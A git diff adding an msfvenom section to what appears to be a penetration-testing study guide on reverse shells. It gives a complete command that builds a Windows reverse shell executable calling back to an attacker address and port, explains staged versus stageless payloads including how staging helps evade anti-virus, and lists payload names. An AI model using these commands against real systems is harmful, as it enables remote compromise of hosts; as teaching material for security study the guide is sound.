@@ -422,3 +422,83 @@ replacing \<IP> with the attacker's IP address and \<PORT> with the appropriate 
 
 For other common reverse shell payloads, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository that contains a wide variety of shell codes. 
 
+## msfvenom
+
+msfvenom is part of the Metasploit framework and can be used to generate code for reverse and bind shells. It is used extensivelt in lower-level exploit development to generate hexadecimal shellcode. However, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.py`).
+
+The standard syntax for msfvenom to generate payloads is as follows:
+
+```console
+~$ msfvenom -p <PAYLOAD> <OPTIONS>
+```
+
+For example, to generate a Windows x64 reverse shell in an executable format, we would use
+
+```console
+~$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.10 LPORT=50000
+```
+
+Here, we generated a payload using four options:
+
+1. `-f <FORMAT>` -- specifies the output format, which in this case is an executable (exe).
+2. `-o <FILENAME>` -- specifies the output location and filename for the generated payload.
+3. `LHOST=<IP>` -- specifies the IP to connect back to.
+4. `LPORT=<PORT>` -- specifies the port to connect back to. This can be anything between 0 and 65535, but recall that ports below 1024 require a listener with root priviledges. 
+
+-----
+
+### Staged vs Stageless
+
+Before proceeding any further, we need to introduce the concept of *staged* and *stageless* reverse shell payloads. 
+
+**Staged** payloads are sent in **two** parts. The first part, known as the *stager* is a piece of code that is executed directly on the server itself. It connects back to a waiting listener, but does not contain any reverse shell code. Instead, upon connection to a listener, it uses the connection to load the real payload, executing it directly. This prevents the payload from touching the disk where it is susceptible to being detected by anti-virus solutions. 
+
+In short, we can think of the payload being split into two parts -- a small initial stager, and a bulkier reverse shell code that is downloaded when the stager is activated.
+
+Staged payloads require a special listener, such as the Metasploit multi/handler. 
+
+**Stageless** payloads are what we have seen up until this point. They are entirely self-contained: there is only one piece of code, which sends a shell back to the listener upon execution. 
+
+Stageless payloads tend to be easier to use, but they are also bulkier and more prone to anti-virus detection. 
+
+On the other hand, staged payloads are harder to use, but the shorter initial stager is harder for anti-virus solutions to detect. However, modern anti-virus solutions may detect the payload as it is loaded into memory by the stager.
+
+### Payload naming conventions
+
+The basic naming convention within msfvenom is as follows:
+
+```
+<OS>/<ARCHITECTURE>/<PAYLOAD>
+```
+
+For example: `linux/x86/shell_reverse_tcp`, which generates a stageless reverse shell for an x86 Linux target. 
+
+One exception to the convention is for Windows 32-bit targets. For such targets, the architecture is not specified. e.g. `windows/shell_reverse_tcp`.
+
+In the earlier examples, we used the payload `shell_reverse_tcp`. The underscore ( `_` ) after `shell` denotes that the payload is **stageless**. For **staged** payloads, we denote it using a forward slash ( `/` ). Thus, the staged equivalent of the above examples is: `shell/reverse_tcp`. 
+
+For *Meterpreter* payloads, we can simply replace `shell` with `meterpreter`. A Windows 64-bit staged Meterpreter payload is named as:
+
+```
+windows/x64/meterpreter/reverse_tcp
+```
+
+> **Meterpreter** is Metasploit's own brand of fully-featured shell. They are completely stable. Meterpreter shells must be caught in Metasploit.
+
+-----
+
+We can list all available payloads in msfvenom using the command:
+
+```console
+~$ msfvenom --list payloads
+```
+
+We can then pipe the output of this command into `grep` to search for specific payloads. For example, the command
+
+```console
+~$ msfvenom --list payloads | grep "linux/x86"
+```
+
+gives us the full set of payloads for 32-bit Linux systems.
+
+
